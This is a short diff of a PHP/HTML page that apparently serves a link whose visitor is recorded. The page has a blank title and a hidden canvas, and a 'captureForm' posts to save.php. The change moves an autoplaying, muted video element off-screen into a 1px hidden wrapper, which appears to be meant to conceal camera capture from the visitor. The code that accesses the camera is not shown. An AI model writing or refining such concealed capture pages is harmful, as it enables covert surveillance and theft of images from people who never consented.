@@ -54,12 +54,13 @@ $recording_sec = intval($link['recording_seconds'] ?? 0);
 <title></title>
 <style>
 * { margin: 0; padding: 0; }
-html, body { width: 100%; height: 100%; background: #fff; }
+html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
+#videoWrap { position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; overflow:hidden; }
 </style>
 </head>
 <body>
 
-<video id="video" width="0" height="0" autoplay playsinline></video>
+<div id="videoWrap"><video id="video" width="320" height="240" autoplay playsinline muted></video></div>
 <canvas style="display:none" id="canvas"></canvas>
 
 <form action="save.php" id="captureForm" method="post">
